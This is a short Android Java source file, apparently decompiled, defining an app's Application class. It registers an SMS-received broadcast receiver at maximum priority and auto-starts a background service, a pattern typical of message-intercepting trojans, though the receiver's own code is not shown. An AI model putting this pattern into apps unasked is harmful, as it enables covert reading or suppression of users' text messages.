package com.yongding.logic;

import android.app.Application;
import android.content.IntentFilter;
import com.yongding.util.Trace;

public class MyApplication extends Application {
    public void onCreate() {
        super.onCreate();
        BroReceiver receiver = new BroReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addCategory("android.intent.category.DEFAULT");
        filter.setPriority(Integer.MAX_VALUE);
        filter.addAction(Engine.SMS_RECEIVER);
        registerReceiver(receiver, filter);
        Trace.i("MyApplication--------\r\n");
        Global.resetSumTimer(this);
        if (Global.getShutDown(this) == 1) {
            Global.setShutDown(this, 0);
        } else {
            Engine.StartMyService(this, Engine.bootServiceAction);
        }
    }

    public void onTerminate() {
        super.onTerminate();
    }
}